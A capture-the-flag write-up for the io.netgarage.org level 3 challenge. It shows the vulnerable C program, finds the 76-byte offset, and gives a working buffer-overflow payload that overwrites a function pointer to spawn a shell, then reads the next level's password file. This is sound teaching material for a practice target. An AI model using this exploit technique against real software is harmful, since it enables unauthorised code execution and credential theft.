# io.netgarage.org: level3
We start with the usual, ssh to the challenge server, login with the password 
we got from the previous challenge, `cd` to /levels and run the challenge 
binary:
```
level3@io:/levels$ ./level03
level3@io:/levels$
```
So the binary has no output, let's take a look at the provided source:
```C
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```
The program requires 2 arguments, one being a command line argument. The
command line argument also needs to greater than 4 characters in length.
Let's try running it with some arbitrary values:
```
level3@io:/levels$ ./level03 aaaa
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
level3@io:/levels$
```
So we need a way to get to the function at `0x8048474`. Examining the source
shows that we go to the function at `functionpointer()`, which is set to the
address of `bad()` at the start. The `bad()` function prints "I'm so sorry, 
you're at 0x80484a4 and you want to be at 0x8048474", where `0x8048474` is the 
address of the `good()` function. 

We see that the command line argument we give is `memcpy`-ed (with no size 
checks!) into `buffer`, which is declared as `char buffer[50];`. We can easily
overflow `buffer` with a trivial buffer overflow. After trial and erroring with
different lengths, we see that 76 characters is where the overflow starts:
```
level3@io:/levels$ ./level03 `python -c "print('A' * 78)"`
This is exciting we're going to 0x8044141
Segmentation fault
level3@io:/levels$ ./level03 `python -c "print('A' * 76)"`
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
level3@io:/levels$
```
We add the last 2 bytes of the address of `good()` after the 76 A's (junk 
bytes):
```
level3@io:/levels$ ./level03 `python -c "print('A' * 76 + '\x74\x84')"`
This is exciting we're going to 0x8048474
Win.
sh-4.3$
```
And we now have a shell! We can now read the pass from `/home/level4/.pass`:
```
sh-4.3$ cat /home/level4/.pass
<REDACTED>
```
And so, level03 is solved.

Happy Hacking!

~MarcoSi